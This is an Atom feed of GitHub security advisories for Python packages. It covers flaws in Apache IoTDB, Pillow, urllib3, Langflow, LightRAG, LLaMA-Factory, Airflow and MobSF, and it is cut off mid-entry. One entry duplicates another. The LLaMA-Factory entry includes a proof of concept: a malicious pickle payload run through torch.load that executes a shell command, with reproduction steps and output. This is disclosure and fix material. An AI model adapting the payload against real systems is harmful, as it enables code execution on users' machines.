<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://xlordz.github.io/github-advisory-database-rss/pip.rss</id>
    <title>Security Advisory for Python packages hosted at PyPI.org</title>
    <updated>2025-07-03T11:29:55.804Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
    <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[apache-iotdb] Apache IoTDB Discloses Sensitive Information via Log Files]]></title>
        <id>https://github.com/advisories/GHSA-5fc3-pqf2-57cx</id>
        <link href="https://github.com/advisories/GHSA-5fc3-pqf2-57cx"/>
        <updated>2025-07-02T14:29:45.000Z</updated>
        <content type="html"><![CDATA[<p>Exposure of Sensitive Information to an Unauthorized Actor, Insertion of Sensitive Information into Log File vulnerability in the OpenIdAuthorizer of Apache IoTDB.</p>
<p>This issue affects Apache IoTDB: from 0.10.0 through 1.3.3, from 2.0.1-beta before 2.0.2.</p>
<p>Users are recommended to upgrade to version 1.3.4 and 2.0.2, which fix the issue.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-26864">https://nvd.nist.gov/vuln/detail/CVE-2025-26864</a></li>
<li><a href="https://lists.apache.org/thread/2kcjnlypppk8qjh17dpz0jvkcpn6l162">https://lists.apache.org/thread/2kcjnlypppk8qjh17dpz0jvkcpn6l162</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2025/05/14/4">http://www.openwall.com/lists/oss-security/2025/05/14/4</a></li>
<li><a href="https://github.com/apache/iotdb/pull/14863">https://github.com/apache/iotdb/pull/14863</a></li>
<li><a href="https://github.com/apache/iotdb/commit/34fcaff6b72470d5ad369307dde7fae8897aea7e">https://github.com/apache/iotdb/commit/34fcaff6b72470d5ad369307dde7fae8897aea7e</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/apache-iotdb/PYSEC-2025-60.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/apache-iotdb/PYSEC-2025-60.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-5fc3-pqf2-57cx">https://github.com/advisories/GHSA-5fc3-pqf2-57cx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5fc3-pqf2-57cx</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-05-14T12:31:11.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[apache-iotdb] Apache IoTDB Discloses Sensitive Information via Log Files]]></title>
        <id>https://github.com/advisories/GHSA-5fc3-pqf2-57cx</id>
        <link href="https://github.com/advisories/GHSA-5fc3-pqf2-57cx"/>
        <updated>2025-07-02T14:29:45.000Z</updated>
        <content type="html"><![CDATA[<p>Exposure of Sensitive Information to an Unauthorized Actor, Insertion of Sensitive Information into Log File vulnerability in the OpenIdAuthorizer of Apache IoTDB.</p>
<p>This issue affects Apache IoTDB: from 0.10.0 through 1.3.3, from 2.0.1-beta before 2.0.2.</p>
<p>Users are recommended to upgrade to version 1.3.4 and 2.0.2, which fix the issue.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-26864">https://nvd.nist.gov/vuln/detail/CVE-2025-26864</a></li>
<li><a href="https://lists.apache.org/thread/2kcjnlypppk8qjh17dpz0jvkcpn6l162">https://lists.apache.org/thread/2kcjnlypppk8qjh17dpz0jvkcpn6l162</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2025/05/14/4">http://www.openwall.com/lists/oss-security/2025/05/14/4</a></li>
<li><a href="https://github.com/apache/iotdb/pull/14863">https://github.com/apache/iotdb/pull/14863</a></li>
<li><a href="https://github.com/apache/iotdb/commit/34fcaff6b72470d5ad369307dde7fae8897aea7e">https://github.com/apache/iotdb/commit/34fcaff6b72470d5ad369307dde7fae8897aea7e</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/apache-iotdb/PYSEC-2025-60.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/apache-iotdb/PYSEC-2025-60.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-5fc3-pqf2-57cx">https://github.com/advisories/GHSA-5fc3-pqf2-57cx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5fc3-pqf2-57cx</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-05-14T12:31:11.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[apache-iotdb] Apache IoTDB Vulnerable to Remote Code Execution]]></title>
        <id>https://github.com/advisories/GHSA-f4rq-f4j9-f6rm</id>
        <link href="https://github.com/advisories/GHSA-f4rq-f4j9-f6rm"/>
        <updated>2025-07-02T14:29:10.000Z</updated>
        <content type="html"><![CDATA[<p>Remote Code Execution with untrusted URI of UDF vulnerability in Apache IoTDB. The attacker who has&nbsp;privilege to create UDF can register malicious function from&nbsp;untrusted URI.</p>
<p>This issue affects Apache IoTDB: from 1.0.0 before 1.3.4.</p>
<p>Users are recommended to upgrade to version 1.3.4, which fixes the issue.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-24780">https://nvd.nist.gov/vuln/detail/CVE-2024-24780</a></li>
<li><a href="https://lists.apache.org/thread/xphtm98v3zsk9vlpfh481m1ry2ctxvmj">https://lists.apache.org/thread/xphtm98v3zsk9vlpfh481m1ry2ctxvmj</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2025/05/14/2">http://www.openwall.com/lists/oss-security/2025/05/14/2</a></li>
<li><a href="https://github.com/apache/iotdb/pull/14365">https://github.com/apache/iotdb/pull/14365</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/apache-iotdb/PYSEC-2025-59.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/apache-iotdb/PYSEC-2025-59.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-f4rq-f4j9-f6rm">https://github.com/advisories/GHSA-f4rq-f4j9-f6rm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-f4rq-f4j9-f6rm</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2025-05-14T12:31:11.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pillow] Pillow vulnerability can cause write buffer overflow on BCn encoding]]></title>
        <id>https://github.com/advisories/GHSA-xg8h-j46f-w952</id>
        <link href="https://github.com/advisories/GHSA-xg8h-j46f-w952"/>
        <updated>2025-07-02T14:20:25.000Z</updated>
        <content type="html"><![CDATA[<p>There is a heap buffer overflow when writing a sufficiently large (&gt;64k encoded with default settings) image in the DDS format due to writing into a buffer without checking for available space. </p>
<p>This only affects users who save untrusted data as a compressed DDS image. </p>
<ul>
<li>Unclear how large the potential write could be. It is likely limited by process segfault, so it's not necessarily deterministic. It may be practically unbounded. </li>
<li>Unclear if there's a restriction on the bytes that could be emitted. It's likely that the only restriction is that the bytes would be emitted in chunks of 8 or 16.</li>
</ul>
<p>This was introduced in Pillow 11.2.0 when the feature was added.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/python-pillow/Pillow/security/advisories/GHSA-xg8h-j46f-w952">https://github.com/python-pillow/Pillow/security/advisories/GHSA-xg8h-j46f-w952</a></li>
<li><a href="https://github.com/python-pillow/Pillow/pull/9041">https://github.com/python-pillow/Pillow/pull/9041</a></li>
<li><a href="https://github.com/python-pillow/Pillow/releases/tag/11.3.0">https://github.com/python-pillow/Pillow/releases/tag/11.3.0</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-48379">https://nvd.nist.gov/vuln/detail/CVE-2025-48379</a></li>
<li><a href="https://github.com/python-pillow/Pillow/commit/ef98b3510e3e4f14b547762764813d7e5ca3c5a4">https://github.com/python-pillow/Pillow/commit/ef98b3510e3e4f14b547762764813d7e5ca3c5a4</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/pillow/PYSEC-2025-61.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/pillow/PYSEC-2025-61.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-xg8h-j46f-w952">https://github.com/advisories/GHSA-xg8h-j46f-w952</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xg8h-j46f-w952</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-07-01T17:29:37.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[urllib3] urllib3 does not control redirects in browsers and Node.js]]></title>
        <id>https://github.com/advisories/GHSA-48p4-8xcf-vxj5</id>
        <link href="https://github.com/advisories/GHSA-48p4-8xcf-vxj5"/>
        <updated>2025-06-30T19:02:24.000Z</updated>
        <content type="html"><![CDATA[<p>urllib3 <a href="https://urllib3.readthedocs.io/en/2.4.0/reference/contrib/emscripten.html">supports</a> being used in a Pyodide runtime utilizing the <a href="https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API">JavaScript Fetch API</a> or falling back on <a href="https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest">XMLHttpRequest</a>. This means you can use Python libraries to make HTTP requests from your browser or Node.js. Additionally, urllib3 provides <a href="https://urllib3.readthedocs.io/en/2.4.0/user-guide.html#retrying-requests">a mechanism</a> to control redirects.</p>
<p>However, the <code>retries</code> and <code>redirect</code> parameters are ignored with Pyodide; the runtime itself determines redirect behavior.</p>
<h2 id="affected-usages">Affected usages</h2>
<p>Any code which relies on urllib3 to control the number of redirects for an HTTP request in a Pyodide runtime.</p>
<h2 id="impact">Impact</h2>
<p>Redirects are often used to exploit SSRF vulnerabilities. An application attempting to mitigate SSRF or open redirect vulnerabilities by disabling redirects may remain vulnerable if a Pyodide runtime redirect mechanism is unsuitable.</p>
<h2 id="remediation">Remediation</h2>
<p>If you use urllib3 in Node.js, upgrade to a patched version of urllib3.</p>
<p>Unfortunately, browsers provide no suitable way which urllib3 can use: <code>XMLHttpRequest</code> provides no control over redirects, the Fetch API returns <code>opaqueredirect</code> responses lacking data when redirects are controlled manually. Expect default browser behavior for redirects.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/urllib3/urllib3/security/advisories/GHSA-48p4-8xcf-vxj5">https://github.com/urllib3/urllib3/security/advisories/GHSA-48p4-8xcf-vxj5</a></li>
<li><a href="https://github.com/urllib3/urllib3/commit/7eb4a2aafe49a279c29b6d1f0ed0f42e9736194f">https://github.com/urllib3/urllib3/commit/7eb4a2aafe49a279c29b6d1f0ed0f42e9736194f</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-50182">https://nvd.nist.gov/vuln/detail/CVE-2025-50182</a></li>
<li><a href="https://github.com/advisories/GHSA-48p4-8xcf-vxj5">https://github.com/advisories/GHSA-48p4-8xcf-vxj5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-48p4-8xcf-vxj5</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-06-18T17:50:11.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[langflow-base] Langflow Unauth RCE]]></title>
        <id>https://github.com/advisories/GHSA-rvqx-wpfh-mfx7</id>
        <link href="https://github.com/advisories/GHSA-rvqx-wpfh-mfx7"/>
        <updated>2025-06-30T14:54:13.000Z</updated>
        <content type="html"><![CDATA[<p>Langflow versions prior to 1.3.0 are susceptible to code injection in the /api/v1/validate/code endpoint. A remote and unauthenticated attacker can send crafted HTTP requests to execute arbitrary code.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/langflow-ai/langflow/security/advisories/GHSA-rvqx-wpfh-mfx7">https://github.com/langflow-ai/langflow/security/advisories/GHSA-rvqx-wpfh-mfx7</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-3248">https://nvd.nist.gov/vuln/detail/CVE-2025-3248</a></li>
<li><a href="https://github.com/langflow-ai/langflow/pull/6911">https://github.com/langflow-ai/langflow/pull/6911</a></li>
<li><a href="https://github.com/langflow-ai/langflow/commit/faac4db133de32fcb6d483fa9ff52f40ce42bdc0">https://github.com/langflow-ai/langflow/commit/faac4db133de32fcb6d483fa9ff52f40ce42bdc0</a></li>
<li><a href="https://github.com/langflow-ai/langflow/releases/tag/1.3.0">https://github.com/langflow-ai/langflow/releases/tag/1.3.0</a></li>
<li><a href="https://www.horizon3.ai/attack-research/disclosures/unsafe-at-any-speed-abusing-python-exec-for-unauth-rce-in-langflow-ai">https://www.horizon3.ai/attack-research/disclosures/unsafe-at-any-speed-abusing-python-exec-for-unauth-rce-in-langflow-ai</a></li>
<li><a href="https://github.com/advisories/GHSA-rvqx-wpfh-mfx7">https://github.com/advisories/GHSA-rvqx-wpfh-mfx7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rvqx-wpfh-mfx7</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2025-06-17T20:14:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[lightrag-hku] HKUDS LightRAG allows Path Traversal via function upload_to_input_dir]]></title>
        <id>https://github.com/advisories/GHSA-v9w6-9hq9-33ch</id>
        <link href="https://github.com/advisories/GHSA-v9w6-9hq9-33ch"/>
        <updated>2025-06-30T11:45:59.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability was found in HKUDS LightRAG up to 1.3.8. It has been declared as critical. Affected by this vulnerability is the function upload_to_input_dir of the file lightrag/api/routers/document_routes.py of the component File Upload. The manipulation of the argument file.filename leads to path traversal. It is possible to launch the attack on the local host. The identifier of the patch is 60777d535b719631680bcf5d0969bdef79ca4eaf. It is recommended to apply a patch to fix this issue.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-6773">https://nvd.nist.gov/vuln/detail/CVE-2025-6773</a></li>
<li><a href="https://github.com/HKUDS/LightRAG/issues/1692">https://github.com/HKUDS/LightRAG/issues/1692</a></li>
<li><a href="https://github.com/HKUDS/LightRAG/issues/1692#issuecomment-3009368235">https://github.com/HKUDS/LightRAG/issues/1692#issuecomment-3009368235</a></li>
<li><a href="https://github.com/HKUDS/LightRAG/commit/60777d535b719631680bcf5d0969bdef79ca4eaf">https://github.com/HKUDS/LightRAG/commit/60777d535b719631680bcf5d0969bdef79ca4eaf</a></li>
<li><a href="https://vuldb.com/?ctiid.314089">https://vuldb.com/?ctiid.314089</a></li>
<li><a href="https://vuldb.com/?id.314089">https://vuldb.com/?id.314089</a></li>
<li><a href="https://vuldb.com/?submit.601276">https://vuldb.com/?submit.601276</a></li>
<li><a href="https://github.com/advisories/GHSA-v9w6-9hq9-33ch">https://github.com/advisories/GHSA-v9w6-9hq9-33ch</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v9w6-9hq9-33ch</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-06-27T21:30:29.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[llamafactory] LLaMA-Factory Allows Arbitrary Code Execution via Unsafe Deserialization in Ilamafy_baichuan2.py]]></title>
        <id>https://github.com/advisories/GHSA-f2f7-gj54-6vpv</id>
        <link href="https://github.com/advisories/GHSA-f2f7-gj54-6vpv"/>
        <updated>2025-06-28T00:04:01.000Z</updated>
        <content type="html"><![CDATA[<h3 id="description">Description</h3>
<p>A critical vulnerability exists in the <code>llamafy_baichuan2.py</code> script of the <a href="https://github.com/hiyouga/LLaMA-Factory">LLaMA-Factory</a> project. The script performs insecure deserialization using <code>torch.load()</code> on user-supplied <code>.bin</code> files from an input directory. An attacker can exploit this behavior by crafting a malicious <code>.bin</code> file that executes arbitrary commands during deserialization.</p>
<h3 id="attack-vector">Attack Vector</h3>
<p>This vulnerability is <strong>exploitable without authentication or privileges</strong> when a user is tricked into:</p>
<ol>
<li>Downloading or cloning a malicious project folder containing a crafted <code>.bin</code> file (e.g. via zip file, GitHub repo).</li>
<li>Running the provided conversion script <code>llamafy_baichuan2.py</code>, either manually or as part of an example workflow.</li>
</ol>
<p>No elevated privileges are required. The user only needs to run the script with an attacker-supplied <code>--input_dir</code>. </p>
<h3 id="impact">Impact</h3>
<ul>
<li>Arbitrary command execution (RCE)</li>
<li>System compromise</li>
<li>Persistence or lateral movement in shared compute environments</li>
</ul>
<h3 id="proof-of-concept-poc">Proof of Concept (PoC)</h3>
<pre><code class="language-python"># malicious_payload.py
import torch, pickle, os

class MaliciousPayload:
    def __reduce__(self):
        return (os.system, ("mkdir HACKED!",))  # Arbitrary command

malicious_data = {
    "v_head.summary.weight": MaliciousPayload(),
    "v_head.summary.bias": torch.randn(10)
}

with open("value_head.bin", "wb") as f:
    pickle.dump(malicious_data, f)
</code></pre>
<p>An example of <code>config.json</code>:</p>
<pre><code class="language-json">{
  "model": "value_head.bin",
  "hidden_size": 4096,
  "num_attention_heads": 32,
  "num_hidden_layers": 24,
  "initializer_range": 0.02,
  "intermediate_size": 11008,
  "max_position_embeddings": 4096,
  "kv_channels": 128,
  "layer_norm_epsilon": 1e-5,
  "tie_word_embeddings": false,
  "vocab_size": 151936
}
</code></pre>
<pre><code class="language-bash">(base) root@d6ab70067470:~/LLaMA-Factory_latest# tree
.
`-- LLaMA-Factory
    |-- LICENSE
    |-- README.md
    |-- malicious_folder
    |   |-- config.json
    |   `-- value_head.bin
    `-- xxxxx(Irrelevant documents omitted)
</code></pre>
<pre><code class="language-bash"># Reproduction
python scripts/convert_ckpt/llamafy_baichuan2.py --input_dir ./malicious_folder --output_dir ./out
</code></pre>
<p>➡️ Running this will execute the malicious payload and create a <code>HACKED!</code> folder.</p>
<pre><code class="language-bash">(base) root@d6ab70067470:~/LLaMA-Factory_latest/LLaMA-Factory# ls
CITATION.cff  LICENSE  MANIFEST.in  Makefile  README.md  README_zh.md  assets  data  docker  evaluation  examples  malicious_folder  pyproject.toml  requirements.txt  scripts  setup.py  src  tests
(base) root@d6ab70067470:~/LLaMA-Factory_latest/LLaMA-Factory# python scripts/convert_ckpt/llamafy_baichuan2.py --input_dir ./malicious_folder --output_dir ./out
2025-04-23 07:36:58.435304: E external/local_xla/xla/stream_executor/cuda/cuda_fft.cc:477] Unable to register cuFFT factory: Attempting to register factory for plugin cuFFT when one has already been registered
WARNING: All log messages before absl::InitializeLog() is called are written to STDERR
E0000 00:00:1745393818.451398    1008 cuda_dnn.cc:8310] Unable to register cuDNN factory: Attempting to register factory for plugin cuDNN when one has already been registered
E0000 00:00:1745393818.456423    1008 cuda_blas.cc:1418] Unable to register cuBLAS factory: Attempting to register factory for plugin cuBLAS when one has already been registered
2025-04-23 07:36:58.472951: I tensorflow/core/platform/cpu_feature_guard.cc:210] This TensorFlow binary is optimized to use available CPU instructions in performance-critical operations.
To enable the following instructions: AVX2 FMA, in other operations, rebuild TensorFlow with the appropriate compiler flags.
Load weights:  50%|██████████████████████████████████████████████████████████████████████████████████▌                                                                                  | 1/2 [00:00&lt;00:00, 123.70it/s]
Traceback (most recent call last):
  File "/root/LLaMA-Factory_latest/LLaMA-Factory/scripts/convert_ckpt/llamafy_baichuan2.py", line 112, in &lt;module&gt;
    fire.Fire(llamafy_baichuan2)
  File "/root/miniconda3/lib/python3.12/site-packages/fire/core.py", line 135, in Fire
    component_trace = _Fire(component, args, parsed_flag_args, context, name)
                      ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/root/miniconda3/lib/python3.12/site-packages/fire/core.py", line 468, in _Fire
    component, remaining_args = _CallAndUpdateTrace(
                                ^^^^^^^^^^^^^^^^^^^^
  File "/root/miniconda3/lib/python3.12/site-packages/fire/core.py", line 684, in _CallAndUpdateTrace
    component = fn(*varargs, **kwargs)
                ^^^^^^^^^^^^^^^^^^^^^^
  File "/root/LLaMA-Factory_latest/LLaMA-Factory/scripts/convert_ckpt/llamafy_baichuan2.py", line 107, in llamafy_baichuan2
    save_weight(input_dir, output_dir, shard_size, save_safetensors)
  File "/root/LLaMA-Factory_latest/LLaMA-Factory/scripts/convert_ckpt/llamafy_baichuan2.py", line 35, in save_weight
    shard_weight = torch.load(os.path.join(input_dir, filepath), map_location="cpu")
                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/root/miniconda3/lib/python3.12/site-packages/torch/serialization.py", line 1040, in load
    return _legacy_load(opened_file, map_location, pickle_module, **pickle_load_args)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/root/miniconda3/lib/python3.12/site-packages/torch/serialization.py", line 1260, in _legacy_load
    raise RuntimeError("Invalid magic number; corrupt file?")
RuntimeError: Invalid magic number; corrupt file?
(base) root@d6ab70067470:~/LLaMA-Factory_latest/LLaMA-Factory# ls
 CITATION.cff   LICENSE       Makefile    README_zh.md   data     evaluation   malicious_folder   pyproject.toml     scripts    src
'HACKED!'       MANIFEST.in   README.md   assets         docker   examples     out                requirements.txt   setup.py   tests
</code></pre>
<h3 id="affected-files">Affected File(s)</h3>
<ul>
<li><a href="https://github.com/hiyouga/LLaMA-Factory/blob/main/scripts/convert_ckpt/llamafy_baichuan2.py#L35">https://github.com/hiyouga/LLaMA-Factory/blob/main/scripts/convert_ckpt/llamafy_baichuan2.py#L35</a></li>
<li><code>scripts/convert_ckpt/llamafy_baichuan2.py</code></li>
<li>Line: <code>torch.load(os.path.join(input_dir, filepath), map_location="cpu")</code></li>
</ul>
<h3 id="suggested-fix">Suggested Fix</h3>
<ul>
<li>Replace <code>torch.load()</code> with safer alternatives like <code>safetensors</code>.</li>
<li>Validate and whitelist file types before deserialization.</li>
<li>Require checksum validation.</li>
</ul>
<p>Example patch:</p>
<pre><code class="language-python"># Replace torch.load() with safe deserialization
try:
    from safetensors.torch import load_file
    tensor_data = load_file(filepath)
except Exception:
    print("Invalid or unsafe checkpoint file.")
    return
</code></pre>
<h3 id="workarounds">Workarounds</h3>
<ul>
<li>Avoid running the script with untrusted <code>.bin</code> files.</li>
<li>Use containers or VMs to isolate script execution.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://pytorch.org/docs/stable/generated/torch.load.html">torch.load() — PyTorch Docs</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/502.html">CWE-502: Deserialization of Untrusted Data</a></li>
</ul>
<h3 id="credits">Credits</h3>
<p>Discovered and reported by <a href="https://github.com/Anchor0221">Yu Rong</a> and <a href="https://github.com/xhjy2020">Hao Fan</a>, 2025-04-23</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/hiyouga/LLaMA-Factory/security/advisories/GHSA-f2f7-gj54-6vpv">https://github.com/hiyouga/LLaMA-Factory/security/advisories/GHSA-f2f7-gj54-6vpv</a></li>
<li><a href="https://github.com/hiyouga/LLaMA-Factory/commit/2989d39239d2f46e584c1e1180ba46b9768afb2a">https://github.com/hiyouga/LLaMA-Factory/commit/2989d39239d2f46e584c1e1180ba46b9768afb2a</a></li>
<li><a href="https://github.com/hiyouga/LLaMA-Factory/blob/main/scripts/convert_ckpt/llamafy_baichuan2.py#L35">https://github.com/hiyouga/LLaMA-Factory/blob/main/scripts/convert_ckpt/llamafy_baichuan2.py#L35</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-46567">https://nvd.nist.gov/vuln/detail/CVE-2025-46567</a></li>
<li><a href="https://github.com/advisories/GHSA-f2f7-gj54-6vpv">https://github.com/advisories/GHSA-f2f7-gj54-6vpv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-f2f7-gj54-6vpv</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-04-23T22:21:13.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[apache-airflow-providers-snowflake] Apache Airflow Providers Snowflake package allows for Special Element Injection via CopyFromExternalStageToSnowflakeOperator]]></title>
        <id>https://github.com/advisories/GHSA-9r64-3wmc-x8m8</id>
        <link href="https://github.com/advisories/GHSA-9r64-3wmc-x8m8"/>
        <updated>2025-06-27T21:15:57.000Z</updated>
        <content type="html"><![CDATA[<p>Failure to Sanitize Special Elements into a Different Plane (Special Element Injection) vulnerability in Apache Airflow Providers Snowflake.</p>
<p>This issue affects Apache Airflow Providers Snowflake: before 6.4.0.</p>
<p>Sanitation of table and stage parameters were added in&nbsp;CopyFromExternalStageToSnowflakeOperator&nbsp;to prevent&nbsp;SQL injection
Users are recommended to upgrade to version 6.4.0, which fixes the issue.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-50213">https://nvd.nist.gov/vuln/detail/CVE-2025-50213</a></li>
<li><a href="https://github.com/apache/airflow/pull/51734">https://github.com/apache/airflow/pull/51734</a></li>
<li><a href="https://lists.apache.org/thread/2kqfmyt2pghg5f6797g8hzvq331v8qx3">https://lists.apache.org/thread/2kqfmyt2pghg5f6797g8hzvq331v8qx3</a></li>
<li><a href="https://github.com/apache/airflow/pull/51734/commits/bcf19916738e4a7065a3911814ba1fa32d6fd669">https://github.com/apache/airflow/pull/51734/commits/bcf19916738e4a7065a3911814ba1fa32d6fd669</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/apache-airflow-providers-snowflake/PYSEC-2025-51.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/apache-airflow-providers-snowflake/PYSEC-2025-51.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-9r64-3wmc-x8m8">https://github.com/advisories/GHSA-9r64-3wmc-x8m8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9r64-3wmc-x8m8</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2025-06-26T21:31:04.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mobsf] MobSF vulnerability allows SSRF due to the allow_redirects=True parameter]]></title>
        <id>https://github.com/advisories/GHSA-m435-9v6r-v5f6</id>
        <link href="https://github.com/advisories/GHSA-m435-9v6r-v5f6"/>
        <updated>2025-06-27T20:43:49.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The fix for the "SSRF Vulnerability on assetlinks_check(act_name, well_knowns)" vulnerability could potentially be bypassed.</p>
<h3 id="details">Details</h3>
<p>Since the requests.get() request in the _check_url method is specified as allow_redirects=True, if "<a href="https://mydomain.com/.well-known/assetlinks.json">https://mydomain.com/.well-known/assetlinks.json</a>" returns a 302 redirect, subsequent requests will be sent automatically. If the redirect location is "<a href="http://192.168.1.102/user/delete/1">http://192.168.1.102/user/delete/1</a>", a request will be sent here as well.</p>
<img src="https://github.com/MobSF/Mobile-Security-Framework-MobSF/assets/150332295/a8c9630e-3d12-441a-816c-8f5e427a5194" alt="image" width="610">

<p>It will be safer to use allow_redirects=False.</p>
<h3 id="impact">Impact</h3>
<p>The attacker can cause the server to make a connection to internal-only services within the organization's infrastructure.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/MobSF/Mobile-Security-Framework-MobSF/security/advisories/GHSA-m435-9v6r-v5f6">https://github.com/MobSF/Mobile-Security-Framework-MobSF/security/advisories/GHSA-m435-9v6r-v5f6</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-54000">https://nvd.nist.gov/vuln/detail/CVE-2024-54000</a></li>
<li><a href="https://github.com/MobSF/Mobile-Security-Framework-MobSF/commit/f22c584aa7d43527970c9da61eb678953cfc0a8e">https://github.com/MobSF/Mobile-Security-Framework-MobSF/commit/f22c584aa7d43527970c9da61eb678953cfc0a8e</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/mobsf/PYSEC-2024-256.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/mobsf/PYSEC-2024-256.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-m435-9v6r-v5f6">https://github.com/advisories/GHSA-m435-9v6r-v5f6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m435-9v6r-v5f6</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-06-27T20:43:48.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[llamafactory] LLaMA-Factory allows Code Injection through improper vhead_file safeguards]]></title>
        <id>https://github.com/advisories/GHSA-xj56-p8mm-qmxj</id>
        <link href="https://github.com/advisories/GHSA-xj56-p8mm-qmxj"/>
        <updated>2025-06-27T15:27:02.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
